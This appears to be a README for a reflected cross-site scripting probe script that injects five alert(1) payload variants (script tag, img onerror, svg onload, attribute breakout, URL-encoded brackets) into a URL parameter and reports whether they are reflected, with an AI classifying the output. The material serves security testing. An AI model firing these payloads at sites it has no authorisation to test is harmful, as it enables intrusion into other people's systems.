# XSS Reflected PoC

Tests reflected cross-site scripting by injecting payloads into a URL parameter
and checking whether they appear unescaped in the response body.

## Setup

1. Identify an endpoint that reflects user input (e.g., search page, error page)
2. Edit `probe.py` and fill in TARGET_URL and PARAM
3. Optionally set a custom PAYLOAD (defaults to `<script>alert(1)</script>`)

## Usage

```bash
python3 probe.py
```

## Probes

Tests 5 payload variants:
- `<script>alert(1)</script>` -- basic script injection
- `<img src=x onerror=alert(1)>` -- event handler via broken image
- `<svg onload=alert(1)>` -- SVG event handler
- `" onfocus="alert(1)" autofocus="` -- attribute breakout
- URL-encoded angle brackets -- encoding bypass

## Output

JSON with `measurements` containing baseline round, primary payload result with `reflected` boolean and `context` string, and per-variant results. No status or confidence -- the AI reads measurements to classify.

## Exit Codes

- `0` -- probes completed (JSON on stdout)
